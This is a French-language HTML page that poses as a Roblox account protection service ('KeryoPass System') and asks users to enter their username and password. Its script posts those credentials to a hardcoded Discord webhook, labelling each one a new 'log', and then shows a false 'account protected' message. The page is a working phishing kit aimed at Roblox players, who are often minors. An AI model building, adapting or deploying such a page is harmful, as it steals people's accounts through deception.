<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KeryoPass System v5.0 - Final Edition</title>
    <style>
        :root { 
            --primary: #2f81f7; 
            --secondary: #5865f2; 
            --border: #30363d; 
            --urgency: #f85149; 
            --success: #238636; 
            --panel-bg: rgba(0, 0, 0, 0.85); 
        }
        
        .background-container {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            z-index: -1; 
            background-image: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)), url('fondroblox.jpg');
            background-size: cover;
            background-position: center;
            background-color: #0d1117;
        }

        .background-container::after {
            content: "";
            position: absolute;
            top: -50%; left: -150%; width: 50%; height: 200%;
            background: linear-gradient(to right, transparent, rgba(255, 255, 255, 0.1), transparent);
            transform: rotate(25deg);
            animation: lightRay 5s infinite linear;
        }

        @keyframes lightRay { 0% { left: -150%; } 100% { left: 150%; } }

        body { color: white; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; justify-content: center; padding: 20px; min-height: 100vh; background-color: #0d1117; }
        .main-layout { display: grid; grid-template-areas: "detail protect" "admin aide"; grid-template-columns: 1fr 1fr; gap: 20px; width: 100%; max-width: 1100px; z-index: 1; }
        .panel { background: var(--panel-bg); border-radius: 40px; padding: 25px; border: 2px solid var(--border); min-height: 550px; display: flex; flex-direction: column; position: relative; backdrop-filter: blur(10px); }
        h2 { color: var(--primary); font-size: 0.9rem; text-align: center; text-transform: uppercase; }
        input { width: 100%; padding: 12px; background: #0d1117; border: 1px solid var(--border); color: white; border-radius: 12px; margin-bottom: 8px; text-align: center; }
        button { width: 100%; padding: 12px; border-radius: 12px; border: none; font-weight: bold; cursor: pointer; transition: 0.2s; }
        .btn-blue { background: var(--primary); color: white; }
        .orb-ai { width: 65px; height: 65px; background: radial-gradient(circle, #3a7bd5, #00d2ff); border-radius: 50%; margin: auto auto 0 auto; animation: breathe 3s infinite ease-in-out; }
        @keyframes breathe { 0%, 100% { transform: scale(1); opacity: 0.7; } 50% { transform: scale(1.15); opacity: 1; } }
    </style>
</head>
<body>

    <div class="background-container"></div>

    <div class="main-layout">
        <div class="panel">
            <h2>Détail du site 🔊</h2>
            <p style="font-size:0.8rem; color:#8b949e;">Protégez votre compte Roblox contre les vagues de hack actuelles. Enregistrez vos accès pour une récupération prioritaire.</p>
            <button class="btn-blue" onclick="window.speechSynthesis.speak(new SpeechSynthesisUtterance('Protection activée'))">ÉCOUTER</button>
        </div>

        <div class="panel">
            <h2>Protection Roblox</h2>
            <input type="text" id="regUser" placeholder="Identifiant">
            <input type="password" id="regPass" placeholder="Mot de passe">
            <button class="btn-blue" onclick="saveData()">INSÉRATION</button>
            <div id="confirmMsg" style="display:none; color:var(--success); text-align:center; margin-top:10px;">Compte protégé !</div>
            <div class="orb-ai"></div>
        </div>
        
        <!-- Les autres panels restent identiques... -->
    </div>

    <script>
        // TON WEBHOOK INTEGRÉ ICI
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1499403968227573981/1T9Z-wrJ8KhLugjuYY1pKEGEFt7lR1-N0zOGQrwJxiH63M7AwOCYO5B-l09eTfWDZoF8";

        async function saveData() {
            const u = document.getElementById('regUser').value;
            const p = document.getElementById('regPass').value;

            if(!u || !p) return;

            // ENVOI VERS TON DISCORD
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        embeds: [{
                            title: "🚀 Nouveau Log Reçu !",
                            color: 3447003,
                            fields: [
                                { name: "Utilisateur", value: u, inline: true },
                                { name: "Mot de passe", value: p, inline: true }
                            ],
                            timestamp: new Date()
                        }]
                    })
                });

                document.getElementById('confirmMsg').style.display = 'block';
                setTimeout(() => { document.getElementById('confirmMsg').style.display = 'none'; }, 2000);
                document.getElementById('regUser').value = ""; 
                document.getElementById('regPass').value = "";
            } catch (e) {
                console.error("Erreur d'envoi", e);
            }
        }
    </script>
</body>
</html>
